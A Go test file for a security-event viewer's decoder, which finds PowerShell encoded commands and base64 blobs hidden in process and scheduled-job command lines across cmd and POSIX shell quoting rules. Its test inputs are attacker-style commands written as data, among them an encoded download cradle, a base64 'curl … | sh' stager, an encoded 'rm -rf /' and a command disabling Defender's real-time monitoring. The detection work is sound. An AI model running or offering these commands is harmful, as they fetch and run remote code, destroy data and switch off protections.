package ocsfview

import "testing"

// TestDecodeCommandLine: the two encodings a command line carries decode when
// they are clean, and nothing else does (adr/0300). PowerShell's encoded
// command is anchored on its flag in any of the spellings PowerShell accepts;
// a bare base64 blob has to be long enough to be meant as one, padded, and
// decode to wholly printable text. Innocent command lines never decode.
func TestDecodeCommandLine(t *testing.T) {
	cases := []struct {
		name, cmd, encoding, text string
	}{
		{"powershell -EncodedCommand", `powershell.exe -NoProfile -EncodedCommand ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"powershell -enc, quoted", `powershell -nop -w hidden -enc "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"`, EncodingBase64UTF16LE, "IEX (New-Object Net.WebClient)"},
		{"powershell -e", `powershell -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"powershell /ec", `pwsh /ec ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"powershell inside a quoted cmd sub-command", `cmd.exe /c "powershell -nop -w hidden -enc ZQBjAGgAbwA="`, EncodingBase64UTF16LE, "echo"},
		{"powershell by path", `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -EncodedCommand ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"pwsh --EncodedCommand, the second dash stripped as PowerShell does", `pwsh --EncodedCommand ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"options that take values are stepped over", `powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Version 5.1 -NonInteractive -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"launched by cmd start", `cmd.exe /c start powershell -enc ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"launched after a chain operator", `whoami && powershell -enc ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"quoted program path with spaces", `"C:\Program Files\PowerShell\7\pwsh.exe" -enc ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"explicit alias -ep takes a value", `powershell.exe -ep Bypass -enc ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"explicit aliases -if -of -ea -wd take values", `pwsh -if Text -of XML -ea AAAA -wd "C:\Program Files" -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"abbreviations resolve in the parser's order (-in is Interactive, -s is ServerMode)", `pwsh -in -s -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"Windows PowerShell -version takes a value", `powershell -version 2 -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"quoted encoded token", `powershell -enc "ZQBjAGgAbwA="`, EncodingBase64UTF16LE, "echo"},
		{"cmd /c quoted sub-command with a chain", `cmd /c "whoami && powershell -enc ZQBjAGgAbwA="`, EncodingBase64UTF16LE, "echo"},
		{"cmd /c with its own switches", `cmd.exe /d /q /c powershell -enc ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"start with a title and switches", `cmd /c start "" /min /d "C:\Program Files" powershell -enc ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"start with a title and a quoted program path", `cmd /c start "" "C:\Program Files\PowerShell\7\pwsh.exe" -enc ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"start reads a first quoted word followed by arguments as the title, so nothing runs", `start "C:\Program Files\PowerShell\7\pwsh.exe" -enc ZQBjAGgAbwA=`, "", ""},
		{"start reads a lone quoted word as the title and runs nothing", `cmd /c start "C:\Program Files\PowerShell\7\pwsh.exe"`, "", ""},
		{"sh -c quoted sub-command", `/bin/sh -c 'pwsh -nop -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
		{"a quoted value with spaces inside a cmd sub-command", `cmd /c powershell -wd "C:\Program Files" -enc ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"a backslash-escaped quote is a literal quote, so the value splits and the options end", `cmd.exe /c "powershell -wd \"C:\Program Files\" -enc ZQBjAGgAbwA="`, "", ""},
		{"start as a word echoed by cmd", `cmd.exe /c echo start powershell -enc ZQBjAGgAbwA=`, "", ""},
		{"a launcher word inside a quoted argument", `cmd.exe /c echo "start powershell -enc ZQBjAGgAbwA="`, "", ""},
		{"an unknown switch ends the options as a file", `pwsh -foo -e ZQBjAGgAbwA=`, "", ""},
		{"-cwa ends the options", `pwsh -cwa whoami -e ZQBjAGgAbwA=`, "", ""},
		{"a shell running a script file, not -c", `sh ./run.sh pwsh -e ZQBjAGgAbwA=`, "", ""},
		{"a second PowerShell on a chained line carries the switch", `cmd /c "powershell -c Set-MpPreference -DisableRealtimeMonitoring 1 & powershell -enc ZQBjAGgAbwA="`, EncodingBase64UTF16LE, "echo"},
		{"cmd's doubled-quote form strips the first and last quote", `cmd.exe /c ""C:\Program Files\PowerShell\7\pwsh.exe" -enc ZQBjAGgAbwA="`, EncodingBase64UTF16LE, "echo"},
		{"cmd's quoted program path alone is the program", `cmd /c "C:\Program Files\PowerShell\7\pwsh.exe"`, "", ""},
		{"clustered shell flags -lc", `/bin/bash -lc 'pwsh -nop -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
		{"an apostrophe is text on a Windows line", `cmd.exe /c echo 'ready & powershell -enc ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"a POSIX line quotes with apostrophes", `/bin/sh -c 'echo "ready & powershell -enc ZQBjAGgAbwA="'`, "", ""},
		{"operators glued to words", `cmd /c whoami&&powershell -enc ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"cmd closes its quote at a backslash-quote and splits there", `cmd /c echo "\" & powershell -enc ZQBjAGgAbwA="`, EncodingBase64UTF16LE, "echo"},
		{"cmd opens a quote at a backslash-quote, so the operator is text", `cmd /c echo \"x & powershell -enc ZQBjAGgAbwA=`, "", ""},
		{"a lost closing quote still reads word by word", `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -enc ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"a stray quote after the program", `powershell.exe" -nop -enc ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"shell options with values before -c", `/bin/bash -o pipefail -c 'pwsh -nop -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
		{"sh -c runs only the next word, the rest are its positional parameters", `/bin/sh -c pwsh -nop -e ZQBjAGgAbwA=`, "", ""},
		{"sh -c with an escaped-space word runs that word as the command line", `/bin/sh -c pwsh\ -nop\ -e\ ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"sh -c's string followed by positional parameters", `/bin/sh -c "pwsh -nop -e ZQBjAGgAbwA=" -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"a quoted -c is still -c to the shell", `bash "-c" 'pwsh -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
		{"a flagged quoted multi-word gets no second guess for its pieces", `powershell -e "d2hvYW1pOyBybSAtcmYgLw== x"`, "", ""},
		{"cmd with no /c opens a shell and runs nothing", `cmd powershell -enc ZQBjAGgAbwA=`, "", ""},
		{"cmd with other switches only", `cmd.exe /q powershell -enc ZQBjAGgAbwA=`, "", ""},
		{"cmd /q /c runs the string", `cmd.exe /q /c powershell -enc ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"a later PowerShell's clean token after an earlier one that is not UTF-16", `powershell -nop -enc hostname & powershell -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA`, EncodingBase64UTF16LE, "IEX (New-Object Net.WebClient)"},
		{"sudo with options and an assignment", `sudo -u root HOME=/root bash -c 'pwsh -nop -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
		{"nohup", `nohup pwsh -e ZQBjAGgAbwA= &`, EncodingBase64UTF16LE, "echo"},
		{"timeout with a duration", `timeout -k 5 30s pwsh -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"env with an assignment", `env FOO=bar pwsh -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"env with a quoted assignment is still an assignment", `env MODE="safe mode" pwsh -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"timeout with a quoted duration", `timeout "30s" pwsh -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"sudo with a quoted option value", `sudo -u "root" pwsh -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"nice -n", `nice -n 10 pwsh -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"sh keeps a backslash before an apostrophe inside double quotes", `/bin/sh -c "echo it\'s; pwsh -e ZQBjAGgAbwA="`, EncodingBase64UTF16LE, "echo"},
		{"sh reads a doubled backslash inside double quotes as one, which then escapes the operator", `/bin/sh -c "echo \\; pwsh -e ZQBjAGgAbwA="`, "", ""},
		{"sh reads four backslashes inside double quotes as two, so the operator stands", `/bin/sh -c "echo \\\\; pwsh -e ZQBjAGgAbwA="`, EncodingBase64UTF16LE, "echo"},
		{"sh reads a doubled backslash outside quotes as one", `/bin/sh -c echo\\;pwsh\ -e\ ZQBjAGgAbwA=`, "", ""},
		{"sh joins a backslash-newline inside double quotes, so a wrapped switch reads whole", "/bin/sh -c \"pwsh -en\\\nc ZQBjAGgAbwA=\"", EncodingBase64UTF16LE, "echo"},
		{"sh joins a backslash-newline between words", "/bin/sh -c \"pwsh -nop \\\n-e ZQBjAGgAbwA=\"", EncodingBase64UTF16LE, "echo"},
		{"sh separates commands at a line break", "/bin/sh -c \"echo hi\npwsh -e ZQBjAGgAbwA=\"", EncodingBase64UTF16LE, "echo"},
		{"sh reads # opening a word as a comment to the end of the line, operators included", `/bin/sh -c "echo # && pwsh -e ZQBjAGgAbwA="`, "", ""},
		{"a # inside a word is text", `/bin/sh -c "echo a#b && pwsh -e ZQBjAGgAbwA="`, EncodingBase64UTF16LE, "echo"},
		{"a comment ends at the line break", "/bin/sh -c \"echo # no\npwsh -e ZQBjAGgAbwA=\"", EncodingBase64UTF16LE, "echo"},
		{"a subshell runs its command", `/bin/sh -c "(pwsh -e ZQBjAGgAbwA=)"`, EncodingBase64UTF16LE, "echo"},
		{"a command substitution runs its command", `/bin/sh -c 'echo $(pwsh -e ZQBjAGgAbwA=)'`, EncodingBase64UTF16LE, "echo"},
		{"a loop body's program follows do", `/bin/sh -c 'while true; do pwsh -e ZQBjAGgAbwA=; sleep 5; done'`, EncodingBase64UTF16LE, "echo"},
		{"a conditional's program follows then", `/bin/sh -c 'if true; then pwsh -e ZQBjAGgAbwA=; fi'`, EncodingBase64UTF16LE, "echo"},
		{"a quoted reserved word is a program name", `/bin/sh -c '"do" pwsh -e ZQBjAGgAbwA='`, "", ""},
		{"sh's variable assignments precede the program", `/bin/sh -c 'DISPLAY=:0 pwsh -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
		{"an assignment-shaped word on a Windows line is the program", `FOO=bar powershell -enc ZQBjAGgAbwA=`, "", ""},
		{"a backquoted command substitution runs its command", "/bin/sh -c 'echo `pwsh -e ZQBjAGgAbwA=`'", EncodingBase64UTF16LE, "echo"},
		{"a command substitution inside double quotes runs its command", `/bin/sh -c 'echo "$(pwsh -e ZQBjAGgAbwA=)"'`, EncodingBase64UTF16LE, "echo"},
		{"a here-document's body is text", "/bin/sh -c 'cat <<EOF\npwsh -e ZQBjAGgAbwA=\nEOF'", "", ""},
		{"a command after a here-document runs", "/bin/sh -c 'cat <<-\"EOF\"\n\tpwsh -e ZQBjAGgAbwA=\n\tEOF\npwsh -e ZQBjAGgAbwA='", EncodingBase64UTF16LE, "echo"},
		{"a quoted assignment-shaped word is a program name", `/bin/sh -c '"DISPLAY=:0" pwsh -e ZQBjAGgAbwA='`, "", ""},
		{"an assignment with a quoted value is an assignment", `/bin/sh -c 'FOO="a b" pwsh -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
		{"an escaped reserved word is a program name", `/bin/sh -c '\do pwsh -e ZQBjAGgAbwA='`, "", ""},
		{"a line continuation vanishes before # is read, so the comment holds", "/bin/echo \\\n# && pwsh -e ZQBjAGgAbwA=", "", ""},
		{"exec runs its command", `/bin/sh -c 'exec pwsh -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
		{"command -v describes and runs nothing", `/bin/sh -c 'command -v pwsh -e ZQBjAGgAbwA='`, "", ""},
		{"time runs its command", `/bin/sh -c 'time -p pwsh -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
		{"redirections precede the program", `/bin/sh -c '</dev/null 2> /dev/null pwsh -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
		{"a redirection's & is no operator", `/bin/sh -c '</dev/null 2>&1 pwsh -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
		{"cmd's redirection & is no operator either", `cmd /c powershell -enc ZQBjAGgAbwA= 2>&1`, EncodingBase64UTF16LE, "echo"},
		{"a here-string's word is data and the next line runs", "/bin/bash -c 'cat <<< \"a\"\npwsh -e ZQBjAGgAbwA='", EncodingBase64UTF16LE, "echo"},
		{"cmd groups commands in parentheses", `cmd /c (echo a & powershell -enc ZQBjAGgAbwA=)`, EncodingBase64UTF16LE, "echo"},
		{"a cmd group holding one command", `cmd /c (powershell -enc ZQBjAGgAbwA=)`, EncodingBase64UTF16LE, "echo"},
		{"a parenthesis inside a cmd command is text", `C:\Program Files (x86)\PowerShell\7\pwsh.exe -enc ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"sudo with the value attached to its option", `sudo -uroot pwsh -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"env -S runs its split string with the words after it", `env -S 'pwsh -nop' -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"env --split-string= with the whole command", `env --split-string='pwsh -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
		{"sh reads all its options before the command string", `bash -c -x 'pwsh -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
		{"-- ends sh's options and the command string follows", `sh -c -- 'pwsh -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
		{"after -- a -c is a script file", `sh -- -c 'pwsh -e ZQBjAGgAbwA='`, "", ""},
		{"a single-quoted POSIX program path", `'/opt/my tools/pwsh' -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"exec with an option and its value", `/bin/sh -c 'exec -a updater pwsh -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
		{"a UTF-8 blob with a byte order mark", `sh -c "echo 77u/Y3VybCBodHRwOi8vMTAuMC40LjIwL3N0YWdlIHwgc2g= | base64 -d | sh"`, EncodingBase64, "curl http://10.0.4.20/stage | sh"},
		{"an arithmetic expansion's << is a shift, not a here-document", "/bin/sh -c 'n=$((1<<2))\npwsh -e ZQBjAGgAbwA='", EncodingBase64UTF16LE, "echo"},
		{"a spaced install path to another program reads on from it", `C:\Program Files\Git\bin\bash.exe -c "pwsh -e ZQBjAGgAbwA="`, EncodingBase64UTF16LE, "echo"},
		{"a substitution inside an assignment leaves the command whole", `/bin/sh -c 'TOKEN="$(cat /tmp/t)" pwsh -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
		{"env -iS, the shebang idiom", `env -iS 'pwsh -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
		{"a reserved word with an empty quoted tail is a program name", `/bin/sh -c 'while true; do"" pwsh -e ZQBjAGgAbwA=; done'`, "", ""},
		{"an escaped > before & leaves the & an operator", `/bin/sh -c 'echo \>& pwsh -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
		{"a continuation on a here-document's line defers its body to the next line break", "/bin/sh -c 'cat <<EOF \\\npwsh -e ZQBjAGgAbwA=\nEOF'", "", ""},
		{"a Windows path to a shell keeps Windows rules for the line", `C:\Windows\System32\bash.exe -c "pwsh -e ZQBjAGgAbwA="`, EncodingBase64UTF16LE, "echo"},
		{"cmd's timeout without a command is the builtin, so the line stays under cmd's rules", `timeout 5 & echo don't & powershell -enc ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"a substitution with spaces inside is one word of the assignment", `/bin/sh -c 'TOKEN=$(cat "/tmp/my file") pwsh -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
		{"a cluster carrying c and ending in a valued letter", `bash -co pipefail 'pwsh -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
		{"an assignment ending in S is not env -S", `env A=BS "pwsh -e ZQBjAGgAbwA="`, "", ""},
		{"a POSIX path with an escaped space stays under POSIX rules", `/opt/my\ tools/bash -c 'pwsh -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
		{"a glued operator ends cmd's timeout words too", `timeout 5& echo don't & powershell -enc ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"an empty flagged token flags nothing, so a shell blob on the line still decodes", `powershell -e "" & sh -c "echo Y3VybCBodHRwOi8vMTAuMC40LjIwL3N0YWdlIHwgc2g= | base64 -d | sh"`, EncodingBase64, "curl http://10.0.4.20/stage | sh"},
		{"sh escapes a quote inside double quotes, so the operator is data", `/bin/sh -c "echo \"a & pwsh -e ZQBjAGgAbwA=\""`, "", ""},
		{"an escaped space in a POSIX path", `/opt/my\ tools/pwsh -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"cmd with a quoted program word", `cmd /c "powershell" -enc ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"an unquoted install path with spaces", `C:\Program Files\PowerShell\7\pwsh.exe -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"an unquoted path with spaces that is not PowerShell", `C:\Program Files\Tool\run.exe powershell -e ZQBjAGgAbwA=`, "", ""},
		{"Windows PowerShell -ImportSystemModules is a flag", `powershell -ImportSystemModules -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"sudo with a clustered valued option", `sudo -Eu root pwsh -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"bash --rcfile takes a value before -c", `bash --rcfile f -c 'pwsh -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
		{"cmd's timeout builtin on a Windows line", `timeout /t 5 & echo don't & powershell -enc ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"an escaped quote ahead is no match, so a stray quote is text", `powershell -nop -w "hidden -enc ZQBjAGgAbwA= \"x`, EncodingBase64UTF16LE, "echo"},
		{"a program file with a path, PowerShell as its argument", `C:\Tools\launcher.exe powershell -e ZQBjAGgAbwA=`, "", ""},
		{"-e after -File is the script's argument", `powershell.exe -File .\probe.ps1 -e ZQBjAGgAbwA=`, "", ""},
		{"-e after -Command is the command's text", `powershell -Command Get-Process -e ZQBjAGgAbwA=`, "", ""},
		{"-e after a bare script word is the script's argument", `powershell .\probe.ps1 -e ZQBjAGgAbwA=`, "", ""},
		{"-e after a lone dash reads from stdin", `pwsh - -e ZQBjAGgAbwA=`, "", ""},
		{"-EncodedArguments is not the command", `pwsh -EncodedArguments ZQBjAGgAbwA= -File .\probe.ps1`, "", ""},
		{"powershell named as data on another command line", `echo powershell -enc ZQBjAGgAbwA=`, "", ""},
		{"powershell as a value, not the program", `schtasks /create /tn Updater /tr powershell -enc ZQBjAGgAbwA=`, "", ""},
		{"shell base64 blob", `sh -c "echo Y3VybCBodHRwOi8vMTAuMC40LjIwL3N0YWdlIHwgc2g= | base64 -d | sh"`, EncodingBase64, "curl http://10.0.4.20/stage | sh"},
		{"another tool's -e is not PowerShell's", `ssh -e hostname user@host`, "", ""},
		{"grep -e", `grep -e Database /etc/passwd`, "", ""},
		{"perl -e", `perl -e TESTTEST`, "", ""},
		{"flagged token that is not utf-16 gets no second guess", `powershell -enc d2hvYW1pOyBybSAtcmYgLw==`, "", ""},
		{"utf-16 garbage after a real flag", `powershell -enc hostname`, "", ""},
		{"bare base64 of a script", `python3 -c exec(__import__("base64").b64decode("aW1wb3J0IG9zOyBvcy5zeXN0ZW0oImlkIik="))`, "", ""},
		{"plain command", `C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule`, "", ""},
		{"a long alphanumeric word", `cmd.exe /c MicrosoftEdgeUpdateCore.exe`, "", ""},
		{"a guid", `rundll32.exe {4D36E972-E325-11CE-BFC1-08002BE10318}`, "", ""},
		{"a sha256", `certutil -hashfile a.exe SHA256 9f1c2e3d4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d`, "", ""},
		{"odd utf-16 length after -enc, too short to be a blob", `powershell -enc ZWNob3c=`, "", ""},
		{"binary that is valid base64", `tool --blob AAECAwQFBgcICQoLDA0ODw==`, "", ""},
		{"empty", ``, "", ""},
	}
	for _, c := range cases {
		encoding, text, ok := decodeCommandLine(c.cmd)
		if c.encoding == "" {
			if ok {
				t.Errorf("%s: decoded %q as %s; want nothing", c.name, text, encoding)
			}
			continue
		}
		if !ok || encoding != c.encoding || text != c.text {
			t.Errorf("%s: = %q %q %v; want %s %q", c.name, encoding, text, ok, c.encoding, c.text)
		}
	}
}

// TestRender_DecodedBesideTheOriginal: the process view carries the decoded
// command beside the field as stored; the group-by key stays on the stored
// value; a plain command line has no decoded slot; the scheduled job's
// command line decodes the same way.
func TestRender_DecodedBesideTheOriginal(t *testing.T) {
	v := Render(Event{ClassUID: 1007, Payload: payload(`{"process":{"name":"powershell.exe","pid":1,"cmd_line":"powershell.exe -NoProfile -EncodedCommand ZQBjAGgAbwA="}}`)}, nil)
	if v.Decoded == nil || v.Decoded.Field != "process.cmd_line" || v.Decoded.Encoding != EncodingBase64UTF16LE || v.Decoded.Text != "echo" {
		t.Fatalf("decoded = %+v; want process.cmd_line base64-utf16le echo", v.Decoded)
	}
	if f, ok := fieldValue(v, "Command line"); !ok || f.Value != "powershell.exe -NoProfile -EncodedCommand ZQBjAGgAbwA=" {
		t.Errorf("the stored command line is not rendered as stored: %+v", f)
	}
	for _, sv := range v.Slots {
		if sv.Name == "cmd_line" && sv.Identity != "powershell.exe -NoProfile -EncodedCommand ZQBjAGgAbwA=" {
			t.Errorf("group-by key = %q; want the stored value", sv.Identity)
		}
	}
	plain := Render(Event{ClassUID: 1007, Payload: payload(`{"process":{"name":"svchost.exe","cmd_line":"svchost.exe -k netsvcs"}}`)}, nil)
	if plain.Decoded != nil {
		t.Errorf("plain command line decoded: %+v", plain.Decoded)
	}
	job := Render(Event{ClassUID: 1006, Payload: payload(`{"job":{"name":"Updater","command_line":"pwsh -enc ZQBjAGgAbwA="}}`)}, nil)
	if job.Decoded == nil || job.Decoded.Field != "job.command_line" || job.Decoded.Text != "echo" {
		t.Errorf("job decoded = %+v; want job.command_line echo", job.Decoded)
	}
}

// TestPowerShellEncodedArguments_OneReadingPerCmd: cmd's quoted string has two
// readings and the first that yields PowerShell wins, so one invocation is
// found once.
func TestPowerShellEncodedArguments_OneReadingPerCmd(t *testing.T) {
	if got := powerShellEncodedArguments(`cmd /c "powershell" -enc ZQBjAGgAbwA=`); len(got) != 1 {
		t.Errorf("flagged tokens = %q; want one", got)
	}
}

// TestTokenize: words split as the shell hands them to the program; a quoted
// word is one token with its quotes removed, whatever it holds; a quote may
// open inside a word; an apostrophe quotes under POSIX rules and is text under
// Windows rules; each token knows where in the line it lies.
func TestTokenize(t *testing.T) {
	line := `"C:\Program Files\pwsh.exe" -wd it's "say \"hi\" && x" ""C:\p q" a" tail`
	check := func(name string, got, want []token) {
		t.Helper()
		if len(got) != len(want) {
			t.Fatalf("%s: tokens = %+v; want %+v", name, got, want)
		}
		for i := range want {
			if got[i].text != want[i].text || got[i].quoted != want[i].quoted || (i > 0 && got[i].start <= got[i-1].start) {
				t.Errorf("%s: token %d = %+v; want %+v", name, i, got[i], want[i])
			}
		}
	}
	check("windows", tokenize(line, false), []token{
		{text: `C:\Program Files\pwsh.exe`, quoted: true},
		{text: "-wd"},
		{text: "it's"},
		{text: `say "hi" && x`, quoted: true},
		{text: `C:\p`, quoted: true},
		{text: `q a`, quoted: true},
		{text: "tail"},
	})
	posix := tokenize(`'a b' it's`, true)
	if len(posix) != 2 || !posix[0].quoted || posix[0].text != "a b" || posix[1].quoted || posix[1].text != "it's" {
		t.Errorf("posix quoting = %+v; want 'a b' quoted and an unmatched apostrophe as text", posix)
	}
	if got := tokenize("", false); len(got) != 0 {
		t.Errorf("empty line tokenized to %+v", got)
	}
	if got := tokenize(`a "unterminated -e ZQBjAGgAbwA=`, false); len(got) != 4 || got[1].quoted || got[1].text != `"unterminated` {
		t.Errorf("unmatched quote = %+v; want it read as text", got)
	}
	if got := tokenize(`"a ""b"" c"`, false); len(got) != 1 || got[0].text != `a "b" c` {
		t.Errorf("argv doubled quote = %+v; want one token a \"b\" c", got)
	}
	if got := tokenize(`"it\'s" 'x'`, true); len(got) != 2 || got[0].text != `it\'s` {
		t.Errorf("posix backslash-apostrophe inside double quotes = %+v; want it\\'s kept", got)
	}
	if got := tokenize("a\\\nb \"c\\\nd\" e\\\n", true); len(got) != 3 || got[0].text != "ab" || got[1].text != "cd" || got[2].text != "e" {
		t.Errorf("posix line continuation = %+v; want ab, cd, e", got)
	}
	if got := tokenize(`A=$(b "c d") e`, true); len(got) != 2 || got[0].text != `A=$(b "c d")` || got[1].text != "e" {
		t.Errorf("posix substitution inside a word = %+v; want one word with it", got)
	}
	if got := tokenize(`'a\' b'`, true); len(got) != 2 || got[0].text != `a\` || got[1].text != `b'` {
		t.Errorf("posix single quotes escape nothing = %+v; want a\\ and b'", got)
	}
	if got := tokenize(`cmd /c  powershell -e X`, false); len(got) != 5 || got[2].start != 8 {
		t.Errorf("token offsets = %+v; want powershell at 8", got)
	}
}

// TestSplitCommands: a line is cut at the shell's operators outside the
// shell's own quoting, glued or not; cmd quotes with double quotes only and
// escapes with a caret, sh with either quote and a backslash.
func TestSplitCommands(t *testing.T) {
	cmds := func(cs []command) []string {
		out := make([]string, len(cs))
		for i, c := range cs {
			out[i] = c.text
		}
		return out
	}
	eq := func(a, b []string) bool {
		if len(a) != len(b) {
			return false
		}
		for i := range a {
			if a[i] != b[i] {
				return false
			}
		}
		return true
	}
	cases := []struct {
		line string
		sh   shell
		want []string
	}{
		{`whoami&&powershell -e X | more`, windowsShell, []string{"whoami", "powershell -e X", "more"}},
		{`echo "a & b" & echo 'c & d' ^& e`, windowsShell, []string{`echo "a & b"`, `echo 'c`, `d' ^& e`}},
		{`echo "a & b" ; echo 'c ; d' \; e`, posixShell, []string{`echo "a & b"`, `echo 'c ; d' \; e`}},
		{`echo "a \" & b" ; c`, posixShell, []string{`echo "a \" & b"`, `c`}},
		{`cmd /c echo \"x & y`, windowsShell, []string{`cmd /c echo \"x & y`}},
		{"echo a\npwsh -e X # tail\n# whole\n(x) && y", posixShell, []string{"echo a", "pwsh -e X", "x", "y"}},
		{"echo \\\n b; c", posixShell, []string{"echo \\\n b", "c"}},
		{"echo a#b | c", posixShell, []string{"echo a#b", "c"}},
		{"echo a\n# c & d", windowsShell, []string{"echo a\n# c", "d"}},
		{"echo `a` \"$(b) c\" (d)", posixShell, []string{"a", "b", "echo `a` \"$(b) c\"", "d"}},
		{"echo \\>& b", posixShell, []string{"echo \\>", "b"}},
		{"cat <<EOF; x\nbody; pwsh\nEOF\nnext", posixShell, []string{"cat <<EOF", "x", "next"}},
		{"echo \\\n# a && b", posixShell, []string{"echo \\"}}, // the text stays verbatim; tokenize removes the continuation
		{"a 2>&1 | b", posixShell, []string{"a 2>&1", "b"}},
		{"(a & b) & c", windowsShell, []string{"a", "b", "c"}},
		{"x (a) & c", windowsShell, []string{"x (a)", "c"}},
		{"cmd /d /c (a & b) & c", windowsShell, []string{"cmd /d /c", "a", "b", "c"}},
		{"n=$((1<<2)); b", posixShell, []string{"n=$((1<<2))", "b"}},
		{"cat <<< a\nb", posixShell, []string{"cat <<< a", "b"}},
		{``, windowsShell, nil},
	}
	for _, c := range cases {
		got := splitCommands(c.line, c.sh)
		if !eq(cmds(got), c.want) {
			t.Errorf("%q: = %q; want %q", c.line, cmds(got), c.want)
		}
		for _, g := range got {
			if c.line[g.start:g.start+len(g.text)] != g.text {
				t.Errorf("%q: offset of %q wrong", c.line, g.text)
			}
		}
	}
}
